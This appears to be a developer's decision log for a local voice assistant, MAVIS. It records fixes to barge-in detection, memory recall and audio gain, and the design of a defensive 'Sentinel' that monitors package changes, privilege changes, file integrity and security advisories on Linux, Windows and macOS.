Barge-in's first contact with real speakers. Every single reply was cut off one to two seconds in, with `VAD: user spoke during playback — interrupting MAVIS` while nobody was speaking. From the user: "it does respond, but gets cut off after 2 words, no audio."

### Problem · The measuring window was spent on silence
**Symptom:** Six replies, six self-interruptions. The thresholds in the log give it away: `SPEECH START (level=0.4822, threshold=0.2900, noise_floor=0.1611)` — 0.2900 is exactly 1.8× the noise floor, the *room* threshold. The echo estimate was contributing nothing.
**Actual cause:** `tts_active` is set when a reply is queued, but the sound doesn't arrive until Kokoro has synthesised it and `pw-play` has started — about a second later. The 750 ms measuring window was spent on that silence, so when MAVIS's first word came out of the speakers it was measured against an echo estimate of zero, and it cleared the room threshold immediately.
**Fix:** The window counts frames of *audible* playback, not wall-clock time. Silence teaches nothing about the echo, so the countdown doesn't run during it.
**Also changed:** the echo estimate is now the loudest MAVIS has recently been heard at, decaying about 14% a second, rather than a moving average. An average sits below the syllable peaks, so every peak looked like someone talking.
**Evidence:** Reproduced in a test that mimics the real sequence — playback announced, 1.5 s of silence, then MAVIS's voice for nine seconds — which fails against the old code and passes now. Across three echo levels there is no self-interruption, and a voice at twice the echo level still breaks through.

### Decision · An interruption is a pause, not a kill
**Context:** The first version killed playback the moment it thought it heard someone. When that judgement is wrong the reply is gone, which is what made the failure above so total — MAVIS was mute for the whole session.
**Decision:** The VAD's interruption now *suspends* playback (SIGSTOP) instead of ending it. The transcript decides what happens next: real speech kills it and answers, while nothing, noise, or an unusable transcript resumes it (SIGCONT) from the same sample. Every path that abandons an utterance — too short, too quiet, transcription failed — resumes too, or a reply would stay suspended forever.
**Why it matters beyond this bug:** it changes the cost of being wrong. A false interruption is now a pause of a second or two in the middle of a sentence, not a lost answer, which is what makes it safe to keep barge-in on by default at all.
**Note:** killing a suspended player needs SIGCONT first — a stopped process doesn't act on SIGTERM until it runs again.

### Problem · The microphone is clipping
**Symptom:** `peak=1.000` on every single utterance, transcription confidence between 0.37 and 0.75, and several correct-sounding transcripts dropped for low confidence.
**Cause:** input gain. The waveform is hitting the ceiling and being squared off; Whisper degrades badly on that, and no model or threshold change compensates.
**Fix:** none available in code — the worker now says so loudly in the log when it sees a clipped utterance, with the command to fix it. The 0.6 gain this traces back to was my own guess from 2026-09-20 (§4), made when the thresholds were fixed numbers; they follow the room now, so a quieter microphone costs nothing.

### Decision · Prefer PipeWire over the raw sound card for capture
**Context:** Device scoring put `sysdefault:CARD=Generic` above `pipewire`, from a 2026-08-15 session where cpal's `default` resolved to a route with no signal.
**Decision:** `pipewire` first, then `pulse`, then `default`, then the card — and anything whose name mentions echo cancellation above all of them.
**Why:** going straight to the card bypasses everything the audio server does: the source the user actually selected, their input processing, and echo cancellation. Echo cancellation is the real answer to barge-in with speakers — with it the microphone never hears MAVIS at all, and the thresholds above stop mattering. `MAVIS_AUDIO_DEVICE` still overrides by exact name.

### Problem · `MAVIS_AUDIO_DEVICE` broke playback
Long-known (§14), fixed here because it blocks the change above: the variable names a *microphone*, and the executor was passing it to the audio player as an output device — with `--device`, which isn't even `pw-play`'s flag for that. Playback output now has its own variable, `MAVIS_AUDIO_OUTPUT`, and each player gets the flag it actually takes.

### What worked in this run
- The speech detector: two utterances of pure noise came back as "0.00s speech in 0 region(s)" and never reached Whisper.
- "Sorry, I didn't catch that" fired correctly on a 0.46-confidence transcript.
- The worker's logs appeared for the first time, which is the only reason `peak=1.000` and the VAD-filter timings were visible at all.
- Replies stayed fast: 0.5–3.9 s, median under a second.
- The name came back right, including from "Mavis, what's my name?" — the phrasing that got it wrong on 09-26.

---

## 18. Memory that follows you into the next session

**Symptom (2026-09-30):** MAVIS had just started. The user said "hello Mavis, can you hear me". MAVIS read out a shell command — the contents of the clipboard, from a session four days earlier.

### Problem · A new run started mid-conversation
**Actual cause:** working memory's event ring is written to disk and restored at startup, so the prompt for the very first utterance of a fresh run ended with:

```
- [user] What is on my clipboard, Mavis?
- [mavis] MAVIS_SENTINEL=1 … cargo run 2>&1 | tee ~/mavis-test.log
- [user] What is on my clipboard, Mavis?
- [mavis] MAVIS_SENTINEL=1 … cargo run 2>&1 | tee ~/mavis-test.log
```

A small model asked a vague question after that pattern answers with the pattern. This is §16's echo problem again, except the history it copied from was days old and nothing in the session could explain it.

**Fix:** a restart starts a new conversation. The event ring, the current intent and the active plan are dropped at startup; the user's name stays, and so do recall, the daily summaries and the entity graph, which are the things worth keeping. What MAVIS knows survives a restart. What was being said doesn't.

**Reverses:** part of Phase 5's "session recovery" (2026-08-26), which restored the conversation so MAVIS could carry on after a crash. In practice restarts are far more often deliberate than crashes, and resuming a four-day-old thread is worse than starting clean.

### Problem · Recall kept returning the question being asked
**Symptom:** "Mavis, can you hear me?" recalled "Hello Robus, can you hear me?" and the hallucinated greeting from the 09-22 run.
**Two causes:**
1. Questions were stored as memories until 09-26. They aren't any more, but everything recorded before that is still in the database. `purge_by_current_rules()` now deletes, at startup, anything today's rules would not store — idempotent, and it reports how many went.
2. Full-text search matched on the words that matter least. A recalled memory that is essentially the sentence being answered — 70% word overlap or more, measured both ways — is now dropped before it reaches the prompt.

**Evidence:** With an old-style database seeded with two stored questions and two statements: the questions are purged, "Mavis, can you hear me?" now recalls nothing at all, "what am I working on" recalls the sentinel statement, and "what is my name" recalls the name. Tested directly against the store.

### Problem · "What's on my clipboard?" — "main" (2026-09-30, later run)
**Symptom:** Three clipboard questions, three replies of `"main"`.
**Actual cause:** The clipboard held 3,158 characters of copied terminal session. It was injected raw, newlines and all, so everything after the first line became its own line in Working Memory — shell prompts, `git reset --soft HEAD~1`, the lot — and the model answered with a word lifted from a shell prompt.
**Fix:** the clipboard is flattened to a single line before injection, and when it's longer than 200 characters MAVIS says how long it is rather than pretending the fragment is the whole thing.

### Decision · Recall surfaces facts, not conversation
**Why:** Even after questions stopped being stored, recall kept returning ordinary chatter: answering a clipboard question, it offered "Earlier, user said: MAVIS, open Firefox browser." A command from last week is not context for anything.
**Decision:** only memories scoring 8 or more — the band `score_importance` already reserves for something the user stated about themselves — are injected into prompts. Everything is still recorded; replay and the daily summaries read all of it.
**Evidence:** against a seeded store, "What is on my clipboard, MAVIS?" now recalls nothing, while "what am I working on", "what is my name" and "what compositor" each recall the matching stated fact.

### Decision · Scale audio that arrives above full scale
**Context:** every utterance for three runs has arrived at 2.2–2.3× full scale. Whisper and Silero both expect samples within [-1, 1].
**Decision:** the worker scales anything above 1.0 down to 0.95 before the speech detector sees it, and says so with the real figure.
**Why this can help rather than just tidy up:** a signal that *saturates* is capped at 1.0 and the waveform is destroyed. A peak of 2.2 means gain was applied after capture — nothing is clipped at the ceiling, it is simply too loud — and scaling that back is exact. Where the microphone preamp itself distorted first, scaling still prevents the extra damage of feeding out-of-range samples into the mel filterbank.
**Still the right fix:** turn the capture gain down. This is a guard, not a cure.

### Still open · The microphone
`peak=2.259` in this run — the signal is not merely clipping, it is arriving at more than double full scale, so PipeWire is applying gain above 100%. The warning now prints the real figure instead of "1.0". Everything else on the audio path is downstream of this: at that level Whisper returned "Hello, Moogers" for "hello Mavis" and a 0.37 confidence.

## 19. The Sentinel speaks — Phase 8.5 step 2b

**Date:** 2026-10-01. **Status:** built, `cargo test` and `cargo clippy` clean. **Not yet heard on hardware** — every claim below is about tests against seeded stores and the event bus, not a voice run.

What it does, with `MAVIS_SENTINEL=1`:

- **Leads.** On the next utterance, pending Notable (and, from step 3, Critical) changes are said first — the same one-sentence-per-update summary as step 2a — and then the utterance is handled as normal. Each change is marked announced so it is told once.
- **"What changed recently?"** — answered from the store: every severity, the latest three updates at most, a week by default or the window the planner already recognises ("yesterday", "this morning", "last week").
- **"What did that update do?"** — the update MAVIS last spoke about, or the most recent one if it hasn't spoken about any.

With the Sentinel off, nothing here runs: the planner doesn't open `sentinel.db` and these questions go to the model exactly as before.

### Decision · No LLM on this path, not even to phrase it
**Why:** three reasons, any one sufficient. Worker replies are cut to two sentences and 180 characters, so a package list would be truncated. The 3.8B model is unreliable at keeping a list of names intact. And a model "summarising" what changed is a model choosing which packages are worth mentioning — a severity decision by another name, which ADR-007 and ADR-010 rule out. The sentences come from the store; the questions are recognised by phrase, like the action intents (ADR-006), and never reach the worker.
**Evidence:** **Proven.** A planner-level test sends "MAVIS, what changed recently?" through `handle_event` and asserts no `WorkerRequest` is published; with the Sentinel wiring removed it fails.

### Decision · The lead is its own plan, published before the reply
**Why:** the permission gate reviews plans in order and the TTS queue plays in order, so a `say` published first is spoken first — and it fills the second or two the model takes to answer instead of adding to the wait. It also lands in the working-memory ring as something MAVIS said, so a follow-up about "hyprland" has context.
**Not a lead:** "stop" — a request for silence is never answered with news. A question about changes — the answer covers it, so there is no separate lead.
**Evidence:** **Proven** at the bus: "open firefox" with one pending change publishes the announcement and then the app plan, in that order; the same utterance again publishes only the app plan. Fails without the wiring. Whether it *sounds* right — order, pacing, barge-in over it — is untested until a hardware run.

### Decision · Marked told before it is spoken, and not spoken if that fails
**Why:** if marking failed and the announcement were spoken anyway, it would be repeated on every utterance until the database recovered — the most intrusive failure available. Silence plus a warning in the log is better.
**Consequence:** "told" means "published to the queue", not "heard". If the user talks over it, it isn't repeated — it is still answerable by asking what changed.

### Decision · A backlog is counted, not read
**Context:** a machine left off for a fortnight might have five updates' worth of pending changes.
**Decision:** the newest two updates are spoken; the rest are counted ("There were also 3 earlier updates. Ask me what changed to hear about them.") and **all** are marked told.
**Rejected:** marking only the spoken ones. The rest would then lead the next utterance, and the one after — the same news dripped out two at a time.
**Known gap:** "what changed?" defaults to the last week, so a counted update older than that needs "what changed last week" or it won't come back. Acceptable for now; noted rather than engineered around.

### Decision · "That update" is the one last mentioned, not the newest
**Why:** routine updates are never announced, so the common case is: Friday's update pulled in hyprland, Saturday's only upgraded things, MAVIS mentions Friday's on Monday, and the user asks "what did that update do?". The newest is Saturday's — the wrong answer. The planner keeps the start of the last update it spoke about; it is lost on a planner restart, which only means the question falls back to the newest.
**Evidence:** **Proven** against a seeded store with exactly that shape.

### Decision · Long lists give a count and five names
**Why:** 2b is the first time these sentences are spoken, and "didn't ask for" includes every dependency of something the user *did* ask for — `pacman -S plasma` pulls in well over a hundred packages. Past five names a sentence now says "pulled in 140 packages you didn't ask for, including a, b, c, d and e". Upgrades are counted past two when describing an update. The full lists stay in the store.
**Evidence:** **Proven** — a 40-package test sentence names five; at the cap all names are said.

### Problem · The first-run import was visible as news
**Found:** while wiring the planner, before it shipped. Not by a user.
**Cause:** the first run recorded history and *then* marked it announced, as two steps. With nothing but the Sentinel reading the store that didn't matter. Once the planner asks for pending changes on every utterance, it does: the first run lands 20 s after startup — when the user is likely to be talking — and on the target machine is thousands of rows, each its own fsync in autocommit mode, so the gap was seconds long. A read in it would have seen the machine's entire history as unannounced, and the lead would have marked it all told while announcing a sample: "Your system update on 3 March pulled in… There were also 2,077 earlier updates."
**Fix:** `record_all_announced` writes the rows already marked, in one transaction. Batch writes in general are now one transaction, so the planner can't see half an update either.
**Evidence:** **Proven.** A test runs a 3,000-row first-run import on one connection while a second polls for pending changes. Against the old two-step import the poller saw **2,990** pending (failed 4 of 4 runs); with the fix it never sees one. It can't be flaky in the passing direction — inside one transaction there is no instant at which a pending row exists.

### Problem · Every routine upgrade was loaded on every utterance
**Cause:** `unannounced()` selected every row with `announced = 0` and filtered severity in Rust. Routine changes are never announced, so they accumulate there forever — harmless while nothing called it, a growing scan per utterance once the planner did.
**Fix:** the severity filter is in SQL, with an `(announced, severity)` index.
**Evidence:** reasoned, plus tests that every threshold still filters correctly. Not timed.

### Decision · The planner has its own connection to `sentinel.db`
**Why:** the Sentinel owns its store on its own task; sharing it would tie the planner's turn to the Sentinel's scan. SQLite coordinates two connections (rusqlite's default busy timeout is 5 s), and every planner query runs in `spawn_blocking` (rule 8). The Sentinel still only ever updates the `announced` flag, and now so does the planner — the change log stays append-only.

### Still open
- **Hardware.** Hearing the lead before a reply, barge-in over it, and the questions recognised through the real microphone — given the capture-gain problem, "what changed" may well transcribe as something else.
- **Recognition is a positive grammar** in `sentinel/speech.rs`. "What changed in the Rust release?" goes to the model because "rust" isn't in it. Utterances that fall just outside will go to the model, which may invent an answer; widen the grammar from what real runs show, not speculatively.
- `sentinel/speech.rs` is ~940 lines, about 60% tests. `planner.rs` grew by ~70 lines of code.

## 20. Privilege surfaces — Phase 8.5 step 3

**Date:** 2026-10-01. **Status:** built, `cargo test` and `cargo clippy` clean. **Not yet run on hardware**, and step 2b — which speaks these — hasn't been either.

### Decision · Snapshots, not logs
**Why:** packages have a transaction log; these surfaces don't. Each is read into a snapshot (item → detail), diffed against the one stored in `sentinel.db`, and replaced in the same transaction that records the changes. The first read of each surface is a silent baseline, as with package history. An unchanged snapshot writes nothing, so the steady state is reads only.

### Decision · What is watched, and how loud
| Surface | Read from | Critical | Notable | Routine |
|---|---|---|---|---|
| Users | `/etc/passwd` | new account with UID 0; UID changed to 0 | new login account (UID ≥ `UID_MIN`, real shell) | system accounts, removals |
| Groups | `/etc/group` | joining root, wheel, sudo, admin or docker | joining any other group | new groups, leaving |
| SSH keys | `~/.ssh/authorized_keys`, `authorized_keys2` | new key | — | removed key |
| sudoers | `/etc/sudoers`, `/etc/sudoers.d` | any change | — | — |
| systemd | `*.wants` / `*.requires` in `/etc/systemd/system`, `/etc/systemd/user`, `~/.config/systemd/user` | — | newly enabled unit | disabled unit |
| setuid/setgid | `/usr/bin`, `/usr/sbin`, `/usr/lib`, `/usr/libexec`, `/usr/local`, `/opt` | new binary | — | removed |

**Rule:** gaining access is Critical or Notable; losing it is Routine. Static, like every other severity (ADR-007).
**Enabled units are Notable, not Critical:** the PHASES table didn't list them as Critical, and enabling a service is ordinary administration. Spoken once is enough.
**The privileged groups are a fixed list of five.** Which groups actually grant sudo is in sudoers, which MAVIS can't read; these are the conventional ones, plus docker, whose members are root in all but name. Not a growing word list — a short statement of convention.

### Decision · sudoers through metadata only
`/etc/sudoers` is `0440 root`. MAVIS sees size, mtime and inode of each file — of the directory itself where it can't be listed, as on Arch — and reports that the sudo configuration changed, never what it says.

### Decision · The setuid walk runs hourly and after package changes
**Measured** in the sandbox: 123,304 files, 2.6 s cold and 0.6 s warm. Too much every minute. It runs at the first scan, whenever the package log moves (packages are how most binaries arrive), and at least hourly, in `spawn_blocking`. Symlinks are never followed. A binary dropped outside a package is caught within the hour.
**Evidence:** on this sandbox's real filesystem the walk found the same 17 setuid/setgid binaries as an independent Python walk, and two consecutive reads of every surface diffed to nothing.

### Problem · An unreadable surface would have caused a flood
**Found:** while writing the collectors, before anything shipped.
**Cause:** the obvious collector returns an empty snapshot when a file can't be read. Diffed against the last one, that is "every group removed" (Routine, silent), and the next good read is "every member added" — `manav` joining wheel, Critical, notified.
**Fix:** an unreadable surface is left out of the scan entirely; its stored snapshot stays as it was. A missing `authorized_keys` is different — it means no keys, and is read as such.
**Evidence:** **Proven.** Two tests — one on the collector, one through the Sentinel's scan with `/etc/group` moved away and back. Against an empty-on-failure collector both fail; with the fix both pass.

### Decision · Spoken as a sentence per scan, by file name
"Today, eve was added to the wheel group." "Today, a new program that runs as root appeared: helper." Paths are reduced to the file name in speech — a spoken path is all slashes — and kept in full in the store. Routine changes are never volunteered but are described when asked ("what changed?"), which now says "changes", not "updates", since a new SSH key isn't one.

### Decision · Unix only
The module is `#[cfg(unix)]`. Windows and macOS surfaces are step 5.

### Still open
- **Hardware.** A real `usermod -aG`, `systemctl enable`, a key added to `authorized_keys`, and seeing the notification and hearing the sentence.
- **Only the running user's `authorized_keys`.** Root's and other users' aren't readable without root.
- **No package attribution.** A setuid binary that arrived with a package is reported the same as one dropped by hand. Correlating with the package log would make it quieter and more useful; not done.
- **`/etc/passwd` only** — LDAP, SSSD and systemd-homed accounts aren't seen.

## 21. Integrity and advisories — Phase 8.5 step 4

**Date:** 2026-10-06. **Status:** built, `cargo test` and `cargo clippy` clean. Run end to end in the sandbox against the **real tools** — see Evidence. **Not yet run on the target machine.**

### Decision · Each check is a tool's output, snapshotted and diffed
**Why:** same shape as step 3. A check runs a tool, its findings become a snapshot, and the snapshot is diffed against the last one in `sentinel.db`. The first run is a silent baseline — a real machine has plenty of standing mismatches (edited configs, files re-owned by install scripts) and they are history, not news.

| Check | Tool | Runs |
|---|---|---|
| Integrity | `pacman -Qkk`, `rpm -Va`, `dpkg --verify` | daily |
| Advisories | `arch-audit`, `debsecan` (Debian only) | daily, only with `MAVIS_SENTINEL_ADVISORIES=1` |

A check whose tool isn't installed is switched off with one log line.

### Decision · What a finding is worth
| Finding | Severity |
|---|---|
| Content of a packaged file differs (size, checksum, type, link target) | **Critical** |
| A packaged file is missing; its owner or permissions differ | Notable |
| Only its timestamp differs | Routine |
| Any of the above on a config file | Routine |
| A file matches its package again | Routine |
| New advisory the scanner rates high or critical | Notable |
| New advisory rated lower; an advisory that no longer applies | Routine |

**Why config files are Routine:** editing `/etc` is what `/etc` is for. pacman marks them `backup file:`, rpm and dpkg with a `c`.
**Why advisories are never Critical:** an Arch machine carries dozens at any time, many unfixed for months. A desktop notification per advisory would be ignored within a week.
**The scanner's rating is mapped, not judged.** "High" and "Critical" are arch-audit's words (and "high urgency" debsecan's); a fixed rule turns them into Notable. MAVIS says "arch-audit reported…" and nothing about what it means (ADR-010).

### Decision · `dpkg --verify`, not `debsums`
**Departs from PHASES as written.** `debsums` is a separate package most machines don't have; `dpkg --verify` ships with dpkg, checks the same md5sums, and prints the same format as `rpm -Va`, so one parser covers both. Confirmed on dpkg 1.22.6.

### Decision · `debsecan` for the Debian tracker, and only on Debian
`debsecan` is the tracker's own client. Reading the tracker directly means an HTTP client and a very large JSON file (rule 9). It is not run on Ubuntu: it would compare Ubuntu's versions against Debian's and report advisories that don't apply.

### Decision · Advisories need a second opt-in
**Why:** every other Sentinel source reads local files. These two download a list. Nothing about the machine is sent, but a background network request is a different kind of thing from reading a log, and "local-first" means the user decides. `MAVIS_SENTINEL_ADVISORIES=1`, default off.

### Decision · Daily, remembered across restarts, lowest priority
**Measured:** `dpkg --verify` over this sandbox's packaged files took **85 s**. A full verify reads every packaged file, so it runs once a day, under `nice -n 19`, with a 15-minute limit, and the store remembers when it last ran — restarting MAVIS ten times in an afternoon doesn't mean ten disk scans. `MAVIS_SENTINEL_CHECK_NOW=1` runs the daily checks at startup regardless, for testing. Tools run with `LC_ALL=C`: pacman translates its messages, and the parser matches English.
**Cost:** the Sentinel's one-minute scans wait while a check runs. Quick scans are published first, so nothing already found is delayed.

### Problem · A failed tool would have looked like a clean machine
**Found:** while writing the runner. Same class as §20's flood.
**Cause:** a tool that crashes, times out, or can't reach its data prints nothing. Read as an empty result, that is "every finding resolved" — and the next good run reports all of them as new, Critical ones included.
**Fix:** a check returns a result only when the run demonstrably finished: `pacman -Qkk` must print a per-package summary line, `rpm -Va` must not print `error:`, `dpkg --verify`, `arch-audit` and `debsecan` must exit 0. Anything else is "no result" — the stored snapshot stays, and the check is retried in an hour.
**Evidence:** **Proven.** With "no result" read as empty, `a_failed_check_does_not_cause_a_flood` fails. Also seen with the real arch-audit: with its source unreachable it exited 1 and the stored advisory stayed.

### Problem · A verify during an upgrade sees half-installed files
**Found:** by reasoning about Critical false alarms, before anything shipped.
**Cause:** mid-transaction, new files are on disk while the package database still describes the old ones. Every one is a content mismatch — Critical.
**Fix:** the integrity check doesn't start while pacman's `db.lck` exists, and its result is discarded if the lock appeared or the package log moved while it ran. It then stays due and retries next minute.
**Evidence:** **Proven** for the lock — the test fails with the discard removed. **Reasoned** for dpkg and rpm, which have no lock file that shows whether it's held; they rely on the log moving, and a single package that takes minutes to unpack without writing a log line could slip through.

### Problem · Without root, "Permission denied" is not a finding
`pacman -Qkk` as a normal user prints `(Permission denied)` for every file it can't stat. Those lines are skipped; rpm's `?` flags and `(Permission denied)` suffix likewise. **Seen** in real pacman output as an unprivileged user. It means root-only files are simply not checked — a limit, not an alarm.

### Evidence · The real tools, end to end
**Date:** 2026-10-06, in the sandbox (Ubuntu 24.04; no Arch machine).
- **pacman 6.0.2** — a package crafted into a real local database, then altered. `pacman -Qkk` output captured as root and as an unprivileged user; the fixture in `integrity.rs` is that output.
- **rpm 4.18.2** — a real RPM built, installed and altered; `rpm -Va` output is the fixture.
- **dpkg 1.22.6** — `dpkg --verify` against this system, with `/usr/bin/debsums` edited.
- **arch-audit 0.1.20** — built from source and run against a crafted advisory list; the `--format` output is the fixture.
- **debsecan 0.4.20.1** — run against a crafted data file; its output is the fixture.

Then the whole path — runner, parser, store, diff, sentence — with the real binaries:
```
pacman + arch-audit   baseline: 0 changes
  after altering      [critical] /opt/mavis-test/bin/hello (from testpkg) no longer matches…
                      [routine]  …/etc/hello.conf (config)
                      [notable]  …/libhello is missing
                      [notable]  arch-audit reports testpkg is affected by CVE-2024-0001, rated critical
  third run           0 changes
dpkg                  baseline: 0 changes (9,395 standing findings — a container image without docs)
  after altering      [critical] /usr/bin/debsums no longer matches what its package installed
  after restoring     [routine]  /usr/bin/debsums matches its package again
```
What this does **not** show: a real Arch system's standing noise, how long `pacman -Qkk` takes on the target disk, or arch-audit against the live advisory feed.

### Still open
- **Hardware.** None of it has run on the target machine.
- **Install scripts.** A new package whose scriptlet re-owns its own files will be reported once as "permissions changed on a packaged file". True, and probably unwanted.
- **Root-only files aren't verified** without root.
- **rpm and dpkg name no package** in a finding; only pacman's output carries it.
- **No advisories on Fedora or Ubuntu.** PHASES names only arch-audit and the Debian tracker.

---

## 22. Windows and macOS — Phase 8.5 step 5

**Date:** 2026-10-06. **Status:** **UNVERIFIED ON REAL HARDWARE**, like the RPM log parser before it. Compiles and is linted on Linux; parsers tested against samples written by hand in the shape the commands are documented to print. Nothing here has run on Windows or macOS, and MAVIS itself has not either.

### What it watches
| | Source | How | Loud when |
|---|---|---|---|
| Windows | Store apps and installed programs | `Get-AppxPackage` + the three Uninstall registry keys | an app appears (Notable) |
| | Scheduled tasks, startup items | `Get-ScheduledTask`, `Win32_StartupCommand` | one is added (Notable) |
| | Defender | `Get-MpThreatDetection` + `Get-MpThreat` | a new detection (Critical) |
| macOS | Homebrew | `brew list --versions` | a formula or cask appears (Notable) |
| | Installer packages | `pkgutil --pkgs`, without `com.apple.*` | a package appears (Notable) |
| | launchd | `*.plist` in `/Library/LaunchDaemons`, `/Library/LaunchAgents`, `~/Library/LaunchAgents` | a job is added (Notable) |

Hourly. Same snapshot-and-diff as steps 3 and 4, so the first run is a silent baseline.

### Decision · An app that comes back is said to have come back
**Context:** PHASES calls out Windows restoring removed apps on update. That is the Hyprland case on another platform.
**Decision:** when an app appears and the store already holds its removal, the change is marked `returned` and spoken as "Candy Crush is back after being removed" rather than "was installed".
**Evidence:** **Proven** at the Sentinel level with a fed inventory: baseline, removal, reappearance.

### Decision · PowerShell prints an end marker
Every script ends by printing `MAVIS-END`. Output without it was cut short and is discarded — the flood guard of §20 and §21 again, for a tool whose exit status says little.

### Decision · A Defender detection is Critical and reported as Defender's
"Microsoft Defender reported a detection: Trojan:Win32/…". The name is Defender's; MAVIS adds nothing (ADR-010). Entries ageing out of Defender's history are not changes.

### Not built · winget
`winget list` shows exactly the two lists already read — Store packages and the Uninstall registry — as a width-truncated table that can't be parsed reliably. Running it would add nothing but a fragile parser.

### Not built · XProtect
**Departs from PHASES as written.** XProtect has no command that lists detections; they are only in the unified log, in a format I could not confirm from here. A scanner verdict is the one thing in this subsystem that must not be guessed at: a wrong parse either invents a detection or hides one. Left unbuilt rather than written blind.

### Still open
- **Everything, on real hardware.** Cmdlet properties, PowerShell's output encoding, how noisy Windows' own scheduled tasks are after a feature update.
- **One line is not even compiled:** the `#[cfg(windows)]` call that stops a console window flashing. The method exists in tokio 1.53; the build has never run on Windows.
- **No "did you ask for it"** on either platform — every new app is Notable, including ones just installed on purpose.

---

*Maintained alongside `PHASES.md`. When a decision is made or a problem is solved, add an entry here in the same change.*